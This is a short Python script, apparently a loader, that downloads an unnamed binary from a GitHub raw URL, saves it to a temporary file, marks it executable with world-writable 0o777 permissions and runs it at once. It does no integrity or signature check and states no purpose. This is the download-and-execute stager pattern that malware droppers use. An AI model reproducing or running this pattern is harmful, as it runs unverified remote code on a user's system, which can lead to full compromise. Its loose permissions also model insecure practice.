import requests
import tempfile
import os
import subprocess

URL = "https://github.com/j4rvis07/rndmx/raw/main/j4rv1s_X"  # binary file

# Download binary to temp file
r = requests.get(URL)
r.raise_for_status()
with tempfile.NamedTemporaryFile(delete=False) as f:
    f.write(r.content)
    tmp_file = f.name

# Make executable
os.chmod(tmp_file, 0o777)

# Run it
subprocess.run([tmp_file])